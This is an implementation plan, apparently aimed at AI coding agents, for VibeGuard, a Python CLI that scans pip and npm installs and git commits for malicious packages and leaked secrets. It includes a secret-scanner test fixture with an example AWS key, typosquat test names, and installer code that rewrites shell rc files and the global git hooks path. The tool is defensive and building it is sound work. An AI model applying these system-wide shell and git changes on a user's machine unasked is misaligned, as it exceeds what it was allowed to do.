# VibeGuard MVP Implementation Plan

> **For agentic workers:** REQUIRED: Use superpowers:subagent-driven-development (if subagents available) or superpowers:executing-plans to implement this plan. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a Python CLI that protects vibecoders from supply chain attacks and leaked secrets via transparent shell hooks and git hooks.

**Architecture:** Click-based CLI installs shell function wrappers (`pip()`, `npm()`) into `~/.zshrc`/`~/.bashrc` that route through vibeguard's scanner before executing the real command. A global git pre-commit hook runs bundled betterleaks binary for secret detection. AI analysis is optional via Anthropic or OpenAI (API key or OAuth). All persistent state lives in `~/.vibeguard/`.

**Tech Stack:** Python 3.10+, Click, Rich, SQLite, betterleaks binary (bundled, MIT), httpx (for AI API calls + OAuth)

---

## File Structure

```
vibeguard/
├── pyproject.toml                  # Project metadata, dependencies, entry points
├── LICENSE                         # MIT
├── THIRD_PARTY_NOTICES             # betterleaks attribution
├── README.md                       # Project README
├── src/
│   └── vibeguard/
│       ├── __init__.py             # Version string
│       ├── __main__.py             # python -m vibeguard support
│       ├── cli.py                  # Click CLI: install, uninstall, status, intercept, scan-secrets
│       ├── config.py               # Load/save ~/.vibeguard/config.toml
│       ├── installer.py            # Shell hook + git hook install/uninstall logic
│       ├── prompt.py               # Shell prompt indicator (shield icon)
│       ├── interceptor.py          # pip/npm interception: parse args, run tiers, exec or block
│       ├── scanner/
│       │   ├── __init__.py
│       │   ├── tier1.py            # Fast checks: known-safe cache, typosquat, registry existence
│       │   ├── tier2.py            # Deep scan: download to temp, inspect setup.py, .pth, obfuscation
│       │   └── tier3.py            # AI analysis: send snippet to Claude/OpenAI for explanation
│       ├── secrets.py              # betterleaks binary manager: download, run, parse output
│       ├── ai/
│       │   ├── __init__.py
│       │   ├── base.py             # AIProvider protocol/base class
│       │   ├── anthropic.py        # Anthropic API key + OAuth provider
│       │   └── openai_provider.py  # OpenAI API key + OAuth provider
│       ├── db.py                   # SQLite: scan history, stats tracking
│       ├── display.py              # Rich output: tables, panels, status bars
│       └── constants.py            # Paths, URLs, version, top-packages list
├── assets/
│   ├── top_pypi_packages.txt       # Top 10,000 PyPI package names (one per line)
│   └── top_npm_packages.txt        # Top 10,000 npm package names (one per line)
├── scripts/
│   └── fetch_top_packages.py       # One-time script to generate top_packages.txt
└── tests/
    ├── conftest.py                 # Shared fixtures: tmp config dir, mock packages
    ├── test_cli.py                 # CLI invocation tests
    ├── test_config.py              # Config load/save tests
    ├── test_installer.py           # Shell hook + git hook install/uninstall tests
    ├── test_interceptor.py         # Interception flow tests
    ├── test_tier1.py               # Tier 1 scanner tests
    ├── test_tier2.py               # Tier 2 scanner tests
    ├── test_tier3.py               # Tier 3 AI scanner tests
    ├── test_secrets.py             # betterleaks integration tests
    ├── test_ai_anthropic.py        # Anthropic provider tests
    ├── test_ai_openai.py           # OpenAI provider tests
    ├── test_db.py                  # Database tests
    └── test_display.py             # Display output tests
```

---

## Chunk 1: Project Foundation + Config + CLI Skeleton

### Task 1: Project scaffolding

**Files:**
- Create: `pyproject.toml`
- Create: `LICENSE`
- Create: `THIRD_PARTY_NOTICES`
- Create: `src/vibeguard/__init__.py`
- Create: `src/vibeguard/__main__.py`
- Create: `src/vibeguard/constants.py`

- [ ] **Step 1: Initialize git repo**

```bash
cd "/Volumes/Second Disk/vibeguard"
git init
```

- [ ] **Step 2: Create pyproject.toml**

```toml
[build-system]
requires = ["hatchling"]
build-backend = "hatchling.build"

[project]
name = "vibeguard"
version = "0.1.0"
description = "Security layer for AI-assisted development. One command, permanent protection."
readme = "README.md"
license = "MIT"
requires-python = ">=3.10"
authors = [{ name = "Berk" }]
keywords = ["security", "supply-chain", "vibecoders", "cli"]
classifiers = [
    "Development Status :: 3 - Alpha",
    "Environment :: Console",
    "Intended Audience :: Developers",
    "License :: OSI Approved :: MIT License",
    "Programming Language :: Python :: 3",
    "Topic :: Security",
]
dependencies = [
    "click>=8.0",
    "rich>=13.0",
    "httpx>=0.27",
    "toml>=0.10",
]

[project.optional-dependencies]
dev = [
    "pytest>=8.0",
    "pytest-cov",
    "pytest-httpx",
]

[project.scripts]
vibeguard = "vibeguard.cli:main"

[tool.hatch.build.targets.wheel]
packages = ["src/vibeguard"]

[tool.pytest.ini_options]
testpaths = ["tests"]
pythonpath = ["src"]
```

- [ ] **Step 3: Create LICENSE (MIT)**

Standard MIT license with Berk's name and 2026.

- [ ] **Step 4: Create THIRD_PARTY_NOTICES**

```
This project bundles the following third-party software:

## betterleaks

- License: MIT
- Repository: https://github.com/betterleaks/betterleaks
- Copyright: Copyright (c) 2026 Zachary Rice

betterleaks is used for secret detection in git commits.
The full MIT license text is available at:
https://github.com/betterleaks/betterleaks/blob/main/LICENSE
```

- [ ] **Step 5: Create src/vibeguard/__init__.py**

```python
"""VibeGuard - Security layer for AI-assisted development."""

__version__ = "0.1.0"
```

- [ ] **Step 6: Create src/vibeguard/__main__.py**

```python
"""Allow running as `python -m vibeguard`."""

from vibeguard.cli import main

main()
```

- [ ] **Step 7: Create src/vibeguard/constants.py**

```python
"""Paths, URLs, and constants."""

from pathlib import Path
import platform
import sys

# VibeGuard home directory
VIBEGUARD_HOME = Path.home() / ".vibeguard"
CONFIG_PATH = VIBEGUARD_HOME / "config.toml"
DB_PATH = VIBEGUARD_HOME / "data" / "vibeguard.db"
HOOKS_DIR = VIBEGUARD_HOME / "hooks"
BIN_DIR = VIBEGUARD_HOME / "bin"
BETTERLEAKS_PATH = BIN_DIR / "betterleaks"
CACHE_DIR = VIBEGUARD_HOME / "cache"

# betterleaks download
BETTERLEAKS_VERSION = "1.1.1"
BETTERLEAKS_BASE_URL = "https://github.com/betterleaks/betterleaks/releases/download"


def get_betterleaks_download_url() -> str:
    """Get platform-specific betterleaks download URL."""
    system = platform.system().lower()
    machine = platform.machine().lower()

    os_name = {"darwin": "darwin", "linux": "linux", "windows": "windows"}.get(system)
    if os_name is None:
        raise RuntimeError(f"Unsupported OS: {system}")

    arch = {"arm64": "arm64", "aarch64": "arm64", "x86_64": "x64", "amd64": "x64"}.get(machine)
    if arch is None:
        raise RuntimeError(f"Unsupported architecture: {machine}")

    ext = "zip" if system == "windows" else "tar.gz"
    filename = f"betterleaks_{BETTERLEAKS_VERSION}_{os_name}_{arch}.{ext}"
    return f"{BETTERLEAKS_BASE_URL}/v{BETTERLEAKS_VERSION}/{filename}"


# Shell hook marker
SHELL_HOOK_START = "# >>> vibeguard >>>"
SHELL_HOOK_END = "# <<< vibeguard <<<"

# Prompt indicator
SHIELD_ICON = "\U0001f6e1\ufe0f"  # Shield emoji

# Top packages cache
TOP_PACKAGES_COUNT = 10_000
```

- [ ] **Step 8: Create .gitignore**

```
__pycache__/
*.pyc
*.egg-info/
dist/
build/
.venv/
.pytest_cache/
*.db
.coverage
```

- [ ] **Step 9: Commit**

```bash
git add pyproject.toml LICENSE THIRD_PARTY_NOTICES src/ .gitignore
git commit -m "feat: project scaffolding with pyproject.toml and constants"
```

---

### Task 2: Config module

**Files:**
- Create: `src/vibeguard/config.py`
- Create: `tests/conftest.py`
- Create: `tests/test_config.py`

- [ ] **Step 1: Write tests for config**

```python
# tests/conftest.py
import pytest
from pathlib import Path


@pytest.fixture
def tmp_vibeguard_home(tmp_path, monkeypatch):
    """Redirect VIBEGUARD_HOME to a temp directory."""
    home = tmp_path / ".vibeguard"
    monkeypatch.setattr("vibeguard.constants.VIBEGUARD_HOME", home)
    monkeypatch.setattr("vibeguard.constants.CONFIG_PATH", home / "config.toml")
    monkeypatch.setattr("vibeguard.constants.DB_PATH", home / "data" / "vibeguard.db")
    monkeypatch.setattr("vibeguard.constants.HOOKS_DIR", home / "hooks")
    monkeypatch.setattr("vibeguard.constants.BIN_DIR", home / "bin")
    monkeypatch.setattr("vibeguard.constants.BETTERLEAKS_PATH", home / "bin" / "betterleaks")
    monkeypatch.setattr("vibeguard.constants.CACHE_DIR", home / "cache")
    return home
```

```python
# tests/test_config.py
from vibeguard.config import load_config, save_config, Config


def test_load_config_default_when_no_file(tmp_vibeguard_home):
    config = load_config()
    assert config.ai_provider is None
    assert config.ai_api_key is None
    assert config.ai_oauth_token is None


def test_save_and_load_roundtrip(tmp_vibeguard_home):
    config = Config(ai_provider="anthropic", ai_api_key="sk-test-123")
    save_config(config)
    loaded = load_config()
    assert loaded.ai_provider == "anthropic"
    assert loaded.ai_api_key == "sk-test-123"


def test_config_file_permissions(tmp_vibeguard_home):
    config = Config(ai_provider="openai", ai_api_key="sk-secret")
    save_config(config)
    from vibeguard.constants import CONFIG_PATH
    import stat
    mode = CONFIG_PATH.stat().st_mode
    # File should not be world-readable (600 or 700)
    assert not (mode & stat.S_IROTH)
    assert not (mode & stat.S_IWOTH)
```

- [ ] **Step 2: Run tests to verify they fail**

```bash
cd "/Volumes/Second Disk/vibeguard"
python -m pytest tests/test_config.py -v
```
Expected: FAIL — `vibeguard.config` does not exist.

- [ ] **Step 3: Implement config module**

```python
# src/vibeguard/config.py
"""Configuration loading and saving for ~/.vibeguard/config.toml."""

from dataclasses import dataclass, field, asdict
from pathlib import Path
import os
import stat
import toml

from vibeguard.constants import CONFIG_PATH, VIBEGUARD_HOME


@dataclass
class Config:
    """VibeGuard configuration."""

    ai_provider: str | None = None  # "anthropic" or "openai"
    ai_auth_method: str | None = None  # "api_key" or "oauth"
    ai_api_key: str | None = None
    ai_oauth_token: str | None = None
    shell_hook_installed: bool = False
    git_hook_installed: bool = False
    prompt_indicator: bool = True

    # Stats
    packages_scanned: int = 0
    packages_blocked: int = 0
    commits_scanned: int = 0
    secrets_caught: int = 0


def load_config() -> Config:
    """Load config from disk, returning defaults if file doesn't exist."""
    if not CONFIG_PATH.exists():
        return Config()

    data = toml.load(CONFIG_PATH)
    known_fields = {f.name for f in Config.__dataclass_fields__.values()}
    filtered = {k: v for k, v in data.items() if k in known_fields}
    return Config(**filtered)


def save_config(config: Config) -> None:
    """Save config to disk with restrictive permissions."""
    VIBEGUARD_HOME.mkdir(parents=True, exist_ok=True)

    data = asdict(config)
    # Remove None values for cleaner TOML
    data = {k: v for k, v in data.items() if v is not None}

    CONFIG_PATH.write_text(toml.dumps(data))

    # Restrict permissions: owner read/write only
    os.chmod(CONFIG_PATH, stat.S_IRUSR | stat.S_IWUSR)
```

- [ ] **Step 4: Run tests to verify they pass**

```bash
python -m pytest tests/test_config.py -v
```
Expected: all PASS.

- [ ] **Step 5: Commit**

```bash
git add src/vibeguard/config.py tests/conftest.py tests/test_config.py
git commit -m "feat: config module with load/save and secure file permissions"
```

---

### Task 3: CLI skeleton

**Files:**
- Create: `src/vibeguard/cli.py`
- Create: `tests/test_cli.py`

- [ ] **Step 1: Write tests for CLI commands**

```python
# tests/test_cli.py
from click.testing import CliRunner
from vibeguard.cli import main


def test_cli_help():
    runner = CliRunner()
    result = runner.invoke(main, ["--help"])
    assert result.exit_code == 0
    assert "vibeguard" in result.output.lower()


def test_cli_version():
    runner = CliRunner()
    result = runner.invoke(main, ["--version"])
    assert result.exit_code == 0
    assert "0.1.0" in result.output


def test_cli_status_before_install(tmp_vibeguard_home):
    runner = CliRunner()
    result = runner.invoke(main, ["status"])
    assert result.exit_code == 0
    assert "not installed" in result.output.lower() or "inactive" in result.output.lower()
```

- [ ] **Step 2: Run tests to verify they fail**

```bash
python -m pytest tests/test_cli.py -v
```

- [ ] **Step 3: Implement CLI skeleton**

```python
# src/vibeguard/cli.py
"""VibeGuard CLI — Security layer for AI-assisted development."""

import click
from rich.console import Console

from vibeguard import __version__
from vibeguard.config import load_config

console = Console()


@click.group()
@click.version_option(version=__version__, prog_name="vibeguard")
def main():
    """Security layer for AI-assisted development. One command, permanent protection."""
    pass


@main.command()
def install():
    """Install VibeGuard shell hooks and git hooks."""
    console.print("[bold]Setting up VibeGuard...[/bold]")
    # Implemented in Task 5 (installer) and Task 8 (setup flow)


@main.command()
def uninstall():
    """Remove all VibeGuard hooks and configuration."""
    console.print("[bold]Removing VibeGuard...[/bold]")
    # Implemented in Task 6


@main.command()
def status():
    """Show VibeGuard status and statistics."""
    config = load_config()
    if not config.shell_hook_installed and not config.git_hook_installed:
        console.print("[dim]VibeGuard is not installed. Run [bold]vibeguard install[/bold] to get started.[/dim]")
        return
    # Full status implemented in Task 12


@main.command()
@click.argument("manager")  # "pip" or "npm"
@click.argument("args", nargs=-1)
def intercept(manager, args):
    """Internal: intercept pip/npm commands (called by shell hook)."""
    # Implemented in Task 9
    pass


@main.command(name="scan-secrets")
@click.argument("files", nargs=-1)
def scan_secrets(files):
    """Internal: scan files for secrets (called by git hook)."""
    # Implemented in Task 11
    pass
```

- [ ] **Step 4: Run tests to verify they pass**

```bash
python -m pytest tests/test_cli.py -v
```

- [ ] **Step 5: Commit**

```bash
git add src/vibeguard/cli.py tests/test_cli.py
git commit -m "feat: CLI skeleton with install, uninstall, status, intercept commands"
```

---

### Task 4: Display module

**Files:**
- Create: `src/vibeguard/display.py`
- Create: `tests/test_display.py`

- [ ] **Step 1: Write tests for display functions**

```python
# tests/test_display.py
from io import StringIO
from rich.console import Console
from vibeguard.display import show_safe, show_blocked, show_status_panel
from vibeguard.config import Config


def test_show_safe_outputs_check(capsys):
    console = Console(file=StringIO(), force_terminal=True)
    show_safe("flask", "3.1.0", console=console)
    output = console.file.getvalue()
    assert "flask" in output
    assert "3.1.0" in output


def test_show_blocked_outputs_warning(capsys):
    console = Console(file=StringIO(), force_terminal=True)
    show_blocked("evil-pkg", "malicious payload detected", console=console)
    output = console.file.getvalue()
    assert "evil-pkg" in output
    assert "BLOCKED" in output


def test_show_status_panel_not_installed():
    console = Console(file=StringIO(), force_terminal=True)
    config = Config()
    show_status_panel(config, console=console)
    output = console.file.getvalue()
    assert "not installed" in output.lower() or "inactive" in output.lower()
```

- [ ] **Step 2: Run tests to verify they fail**

- [ ] **Step 3: Implement display module**

```python
# src/vibeguard/display.py
"""Rich terminal output for VibeGuard."""

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text

from vibeguard import __version__
from vibeguard.config import Config

_default_console = Console()


def show_safe(package: str, version: str = "", elapsed: str = "", *, console: Console | None = None):
    """Show a safe package result."""
    c = console or _default_console
    ver = f" {version}" if version else ""
    time_str = f" ({elapsed})" if elapsed else ""
    c.print(f"[green]\u2714[/green] {package}{ver} \u2014 clean{time_str}")


def show_blocked(package: str, reason: str, suggestion: str = "", *, console: Console | None = None):
    """Show a blocked package result."""
    c = console or _default_console
    c.print(f"\n[bold red]\u2716 BLOCKED[/bold red] \u2014 {package}")
    c.print(f"  [red]{reason}[/red]")
    if suggestion:
        c.print(f"  [dim]{suggestion}[/dim]")
    c.print()


def show_secret_found(file: str, line: int, description: str, *, console: Console | None = None):
    """Show a detected secret."""
    c = console or _default_console
    c.print(f"[bold red]\u2716 BLOCKED[/bold red] \u2014 Secret found in {file}:{line}")
    c.print(f"  [red]{description}[/red]")


def show_status_panel(config: Config, *, console: Console | None = None):
    """Show the vibeguard status dashboard."""
    c = console or _default_console

    if not config.shell_hook_installed and not config.git_hook_installed:
        c.print(Panel(
            "[dim]VibeGuard is not installed.\nRun [bold]vibeguard install[/bold] to get started.[/dim]",
            title=f"VibeGuard v{__version__}",
            border_style="dim",
        ))
        return

    table = Table(show_header=False, box=None, padding=(0, 2))
    table.add_column("Key", style="dim")
    table.add_column("Value")

    active_str = "Active" if config.shell_hook_installed else "Inactive"
    ai_str = "local only"
    if config.ai_provider:
        method = config.ai_auth_method or "api_key"
        ai_str = f"{config.ai_provider} ({method})"

    table.add_row("Status", f"[green]{active_str}[/green]" if config.shell_hook_installed else f"[red]{active_str}[/red]")
    table.add_row("AI", ai_str)
    table.add_row("Shell hook", "[green]\u2713[/green]" if config.shell_hook_installed else "[red]\u2717[/red]")
    table.add_row("Git hook", "[green]\u2713[/green]" if config.git_hook_installed else "[red]\u2717[/red]")
    table.add_row("Packages scanned", str(config.packages_scanned))
    table.add_row("Packages blocked", str(config.packages_blocked))
    table.add_row("Commits scanned", str(config.commits_scanned))
    table.add_row("Secrets caught", str(config.secrets_caught))

    c.print(Panel(table, title=f"VibeGuard v{__version__}", border_style="green"))
```

- [ ] **Step 4: Run tests to verify they pass**

- [ ] **Step 5: Commit**

```bash
git add src/vibeguard/display.py tests/test_display.py
git commit -m "feat: Rich display module for safe/blocked/status output"
```

---

## Chunk 2: Install & Uninstall System

### Task 5: Shell hook installer

**Files:**
- Create: `src/vibeguard/installer.py`
- Create: `src/vibeguard/prompt.py`
- Create: `tests/test_installer.py`

The shell hook defines a `pip()` function that intercepts pip commands and routes them through vibeguard's scanner before calling the real pip.

- [ ] **Step 1: Write tests**

```python
# tests/test_installer.py
import os
from pathlib import Path
from vibeguard.installer import (
    install_shell_hook,
    uninstall_shell_hook,
    install_git_hook,
    uninstall_git_hook,
    get_shell_rc_path,
)
from vibeguard.constants import SHELL_HOOK_START, SHELL_HOOK_END


def test_install_shell_hook_zsh(tmp_path, monkeypatch):
    rc_file = tmp_path / ".zshrc"
    rc_file.write_text("# existing config\n")
    monkeypatch.setattr("vibeguard.installer.get_shell_rc_path", lambda: rc_file)

    install_shell_hook(rc_path=rc_file)

    content = rc_file.read_text()
    assert SHELL_HOOK_START in content
    assert SHELL_HOOK_END in content
    assert "vibeguard intercept pip" in content
    assert "vibeguard intercept npm" in content
    assert "vibeguard intercept npx" in content
    assert "vibeguard intercept yarn" in content
    assert "vibeguard intercept uv" in content


def test_install_shell_hook_idempotent(tmp_path, monkeypatch):
    rc_file = tmp_path / ".zshrc"
    rc_file.write_text("# existing config\n")
    monkeypatch.setattr("vibeguard.installer.get_shell_rc_path", lambda: rc_file)

    install_shell_hook(rc_path=rc_file)
    install_shell_hook(rc_path=rc_file)

    content = rc_file.read_text()
    assert content.count(SHELL_HOOK_START) == 1


def test_uninstall_shell_hook(tmp_path, monkeypatch):
    rc_file = tmp_path / ".zshrc"
    rc_file.write_text("# before\n")
    monkeypatch.setattr("vibeguard.installer.get_shell_rc_path", lambda: rc_file)

    install_shell_hook(rc_path=rc_file)
    uninstall_shell_hook(rc_path=rc_file)

    content = rc_file.read_text()
    assert SHELL_HOOK_START not in content
    assert SHELL_HOOK_END not in content
    assert "# before" in content


def test_install_git_hook(tmp_vibeguard_home):
    install_git_hook()

    hook_path = tmp_vibeguard_home / "hooks" / "pre-commit"
    assert hook_path.exists()
    assert os.access(hook_path, os.X_OK)
    assert "vibeguard scan-secrets" in hook_path.read_text()


def test_uninstall_git_hook(tmp_vibeguard_home):
    install_git_hook()
    uninstall_git_hook()

    hook_path = tmp_vibeguard_home / "hooks" / "pre-commit"
    assert not hook_path.exists()
```

- [ ] **Step 2: Run tests to verify they fail**

- [ ] **Step 3: Implement installer**

```python
# src/vibeguard/installer.py
"""Shell hook and git hook installation/removal."""

import os
import stat
import subprocess
from pathlib import Path

from vibeguard.constants import (
    HOOKS_DIR,
    SHELL_HOOK_START,
    SHELL_HOOK_END,
    VIBEGUARD_HOME,
)


SHELL_HOOK_BLOCK = f"""{SHELL_HOOK_START}
# VibeGuard: intercepts package installs to scan before executing
# Python package managers
pip() {{
    if command -v vibeguard &>/dev/null; then
        vibeguard intercept pip "$@"
    else
        command pip "$@"
    fi
}}
pip3() {{
    if command -v vibeguard &>/dev/null; then
        vibeguard intercept pip "$@"
    else
        command pip3 "$@"
    fi
}}
uv() {{
    if command -v vibeguard &>/dev/null; then
        vibeguard intercept uv "$@"
    else
        command uv "$@"
    fi
}}
pipx() {{
    if command -v vibeguard &>/dev/null; then
        vibeguard intercept pipx "$@"
    else
        command pipx "$@"
    fi
}}
# Node.js package managers
npm() {{
    if command -v vibeguard &>/dev/null; then
        vibeguard intercept npm "$@"
    else
        command npm "$@"
    fi
}}
npx() {{
    if command -v vibeguard &>/dev/null; then
        vibeguard intercept npx "$@"
    else
        command npx "$@"
    fi
}}
yarn() {{
    if command -v vibeguard &>/dev/null; then
        vibeguard intercept yarn "$@"
    else
        command yarn "$@"
    fi
}}
pnpm() {{
    if command -v vibeguard &>/dev/null; then
        vibeguard intercept pnpm "$@"
    else
        command pnpm "$@"
    fi
}}
bun() {{
    if command -v vibeguard &>/dev/null; then
        vibeguard intercept bun "$@"
    else
        command bun "$@"
    fi
}}
bunx() {{
    if command -v vibeguard &>/dev/null; then
        vibeguard intercept bunx "$@"
    else
        command bunx "$@"
    fi
}}
# VibeGuard prompt indicator
if [ -f "{VIBEGUARD_HOME / 'active'}" ]; then
    if [ -n "$ZSH_VERSION" ]; then
        PROMPT="\\U0001f6e1\\ufe0f $PROMPT"
    else
        PS1="\\[\\ \\]\\U0001f6e1\\ufe0f $PS1"
    fi
fi
{SHELL_HOOK_END}
"""


GIT_HOOK_SCRIPT = """#!/bin/sh
# VibeGuard pre-commit hook — scans staged files for secrets
if command -v vibeguard >/dev/null 2>&1; then
    vibeguard scan-secrets
    exit $?
fi
"""


def get_shell_rc_path() -> Path:
    """Detect the user's shell RC file."""
    shell = os.environ.get("SHELL", "/bin/zsh")
    if "zsh" in shell:
        return Path.home() / ".zshrc"
    return Path.home() / ".bashrc"


def install_shell_hook(*, rc_path: Path | None = None) -> Path:
    """Add vibeguard shell functions to the user's shell RC file."""
    rc = rc_path or get_shell_rc_path()

    if rc.exists():
        content = rc.read_text()
        if SHELL_HOOK_START in content:
            # Already installed — remove old version first
            content = _remove_hook_block(content)
    else:
        content = ""

    content = content.rstrip() + "\n\n" + SHELL_HOOK_BLOCK + "\n"
    rc.write_text(content)

    # Touch the active marker file
    VIBEGUARD_HOME.mkdir(parents=True, exist_ok=True)
    (VIBEGUARD_HOME / "active").touch()

    return rc


def uninstall_shell_hook(*, rc_path: Path | None = None) -> None:
    """Remove vibeguard shell functions from the shell RC file."""
    rc = rc_path or get_shell_rc_path()
    if not rc.exists():
        return

    content = rc.read_text()
    if SHELL_HOOK_START not in content:
        return

    content = _remove_hook_block(content)
    rc.write_text(content)

    # Remove active marker
    active_file = VIBEGUARD_HOME / "active"
    if active_file.exists():
        active_file.unlink()


def install_git_hook() -> Path:
    """Install global git pre-commit hook."""
    HOOKS_DIR.mkdir(parents=True, exist_ok=True)

    hook_path = HOOKS_DIR / "pre-commit"
    hook_path.write_text(GIT_HOOK_SCRIPT)
    hook_path.chmod(hook_path.stat().st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)

    # Set global git hooks path
    subprocess.run(
        ["git", "config", "--global", "core.hooksPath", str(HOOKS_DIR)],
        check=True,
        capture_output=True,
    )

    return hook_path


def uninstall_git_hook() -> None:
    """Remove global git pre-commit hook and reset git config."""
    hook_path = HOOKS_DIR / "pre-commit"
    if hook_path.exists():
        hook_path.unlink()

    # Only unset if it points to our hooks dir
    result = subprocess.run(
        ["git", "config", "--global", "--get", "core.hooksPath"],
        capture_output=True,
        text=True,
    )
    if result.returncode == 0 and result.stdout.strip() == str(HOOKS_DIR):
        subprocess.run(
            ["git", "config", "--global", "--unset", "core.hooksPath"],
            capture_output=True,
        )


def _remove_hook_block(content: str) -> str:
    """Remove the vibeguard hook block from shell RC content."""
    lines = content.split("\n")
    result = []
    inside_block = False
    for line in lines:
        if SHELL_HOOK_START in line:
            inside_block = True
            continue
        if SHELL_HOOK_END in line:
            inside_block = False
            continue
        if not inside_block:
            result.append(line)

    # Clean up trailing blank lines
    text = "\n".join(result)
    return text.rstrip() + "\n"
```

- [ ] **Step 4: Run tests to verify they pass**

```bash
python -m pytest tests/test_installer.py -v
```

Note: `test_install_git_hook` may need the git subprocess call mocked if we don't want tests to modify global git config. Add `monkeypatch.setattr("vibeguard.installer.subprocess.run", lambda *a, **kw: None)` if needed.

- [ ] **Step 5: Commit**

```bash
git add src/vibeguard/installer.py src/vibeguard/prompt.py tests/test_installer.py
git commit -m "feat: shell hook and git hook install/uninstall"
```

---

### Task 6: Gitleaks binary manager

**Files:**
- Create: `src/vibeguard/secrets.py`
- Create: `tests/test_secrets.py`

Downloads the betterleaks binary on install and wraps subprocess calls to it.

- [ ] **Step 1: Write tests**

```python
# tests/test_secrets.py
import json
from unittest.mock import patch, MagicMock
from vibeguard.secrets import download_betterleaks, run_betterleaks, parse_betterleaks_output


def test_parse_betterleaks_output_with_findings():
    raw = json.dumps([
        {
            "RuleID": "aws-access-key",
            "Description": "AWS Access Key",
            "File": "config.py",
            "StartLine": 14,
            "Match": "AKIAIOSFODNN7EXAMPLE",
        }
    ])
    findings = parse_betterleaks_output(raw)
    assert len(findings) == 1
    assert findings[0]["file"] == "config.py"
    assert findings[0]["line"] == 14
    assert findings[0]["rule"] == "aws-access-key"


def test_parse_betterleaks_output_empty():
    findings = parse_betterleaks_output("[]")
    assert findings == []


def test_parse_betterleaks_output_no_output():
    findings = parse_betterleaks_output("")
    assert findings == []
```

- [ ] **Step 2: Run tests to verify they fail**

- [ ] **Step 3: Implement secrets module**

```python
# src/vibeguard/secrets.py
"""Gitleaks binary management and secret scanning."""

import json
import os
import platform
import subprocess
import tarfile
import tempfile
import zipfile
from pathlib import Path

import httpx

from vibeguard.constants import BIN_DIR, BETTERLEAKS_PATH, get_betterleaks_download_url


def is_betterleaks_installed() -> bool:
    """Check if betterleaks binary exists and is executable."""
    return BETTERLEAKS_PATH.exists() and os.access(BETTERLEAKS_PATH, os.X_OK)


def download_betterleaks(*, progress_callback=None) -> Path:
    """Download the betterleaks binary for the current platform."""
    url = get_betterleaks_download_url()
    BIN_DIR.mkdir(parents=True, exist_ok=True)

    with tempfile.TemporaryDirectory() as tmp:
        tmp_path = Path(tmp)
        archive_name = url.split("/")[-1]
        archive_path = tmp_path / archive_name

        # Download
        with httpx.stream("GET", url, follow_redirects=True) as response:
            response.raise_for_status()
            total = int(response.headers.get("content-length", 0))
            downloaded = 0
            with open(archive_path, "wb") as f:
                for chunk in response.iter_bytes(chunk_size=8192):
                    f.write(chunk)
                    downloaded += len(chunk)
                    if progress_callback and total:
                        progress_callback(downloaded, total)

        # Extract
        if archive_name.endswith(".tar.gz"):
            with tarfile.open(archive_path, "r:gz") as tar:
                for member in tar.getmembers():
                    if member.name == "betterleaks" or member.name.endswith("/betterleaks"):
                        member.name = "betterleaks"
                        tar.extract(member, BIN_DIR)
                        break
        elif archive_name.endswith(".zip"):
            with zipfile.ZipFile(archive_path) as zf:
                for name in zf.namelist():
                    if "betterleaks" in name.lower():
                        data = zf.read(name)
                        BETTERLEAKS_PATH.write_bytes(data)
                        break

        # Make executable
        BETTERLEAKS_PATH.chmod(BETTERLEAKS_PATH.stat().st_mode | 0o755)

    return BETTERLEAKS_PATH


def run_betterleaks(*, staged_only: bool = True, repo_path: str = ".") -> list[dict]:
    """Run betterleaks and return findings."""
    if not is_betterleaks_installed():
        return []

    cmd = [str(BETTERLEAKS_PATH), "detect", "--report-format", "json", "--report-path", "/dev/stdout"]

    if staged_only:
        cmd.extend(["--staged", "--no-git"])
        # For staged scanning, we'll scan specific files passed to us
    else:
        cmd.extend(["--source", repo_path])

    cmd.append("--no-banner")

    result = subprocess.run(cmd, capture_output=True, text=True, cwd=repo_path)

    # Exit code 0 = no leaks, 1 = leaks found, other = error
    if result.returncode == 0:
        return []

    return parse_betterleaks_output(result.stdout)


def run_betterleaks_on_files(file_paths: list[str]) -> list[dict]:
    """Run betterleaks on specific files (for pre-commit hook)."""
    if not is_betterleaks_installed() or not file_paths:
        return []

    with tempfile.TemporaryDirectory() as tmp:
        # Create a temp directory with the staged files
        # betterleaks will scan this directory
        tmp_path = Path(tmp)
        for fp in file_paths:
            src = Path(fp)
            if src.exists():
                dest = tmp_path / fp
                dest.parent.mkdir(parents=True, exist_ok=True)
                dest.write_bytes(src.read_bytes())

        cmd = [
            str(BETTERLEAKS_PATH), "detect",
            "--source", str(tmp_path),
            "--report-format", "json",
            "--report-path", "/dev/stdout",
            "--no-banner",
            "--no-git",
        ]

        result = subprocess.run(cmd, capture_output=True, text=True)

        if result.returncode == 0:
            return []

        return parse_betterleaks_output(result.stdout)


def parse_betterleaks_output(raw: str) -> list[dict]:
    """Parse betterleaks JSON output into a simpler format."""
    if not raw or not raw.strip():
        return []

    try:
        entries = json.loads(raw)
    except json.JSONDecodeError:
        return []

    findings = []
    for entry in entries:
        findings.append({
            "file": entry.get("File", "unknown"),
            "line": entry.get("StartLine", 0),
            "rule": entry.get("RuleID", "unknown"),
            "description": entry.get("Description", "Secret detected"),
            "match": entry.get("Match", ""),
        })

    return findings
```

- [ ] **Step 4: Run tests to verify they pass**

- [ ] **Step 5: Commit**

```bash
git add src/vibeguard/secrets.py tests/test_secrets.py
git commit -m "feat: betterleaks binary download, execution, and output parsing"
```

---

## Chunk 3: Package Scanning (Tier 1 + 2)

### Task 7: Tier 1 scanner — fast checks

**Files:**
- Create: `src/vibeguard/scanner/__init__.py`
- Create: `src/vibeguard/scanner/tier1.py`
- Create: `tests/test_tier1.py`
- Create: `assets/top_packages.txt` (start with top 100 for dev, expand later)

- [ ] **Step 1: Write tests**

```python
# tests/test_tier1.py
from vibeguard.scanner.tier1 import (
    is_known_safe,
    check_typosquatting,
    check_package_exists,
    tier1_scan,
    Tier1Result,
)


def test_known_safe_package():
    assert is_known_safe("flask") is True
    assert is_known_safe("numpy") is True
    assert is_known_safe("requests") is True


def test_unknown_package_not_safe():
    assert is_known_safe("xyzzy-not-a-real-package-12345") is False


def test_typosquatting_detects_close_names():
    result = check_typosquatting("reqeusts")  # Misspelling of "requests"
    assert result is not None
    assert result["similar_to"] == "requests"


def test_typosquatting_clean_for_legit():
    result = check_typosquatting("flask")
    assert result is None


def test_tier1_scan_safe_package():
    result = tier1_scan("flask")
    assert result.safe is True
    assert result.tier == 1


def test_tier1_scan_suspicious():
    result = tier1_scan("reqeusts")  # Typosquat
    assert result.safe is False
    assert "typosquat" in result.reason.lower() or "similar" in result.reason.lower()
```

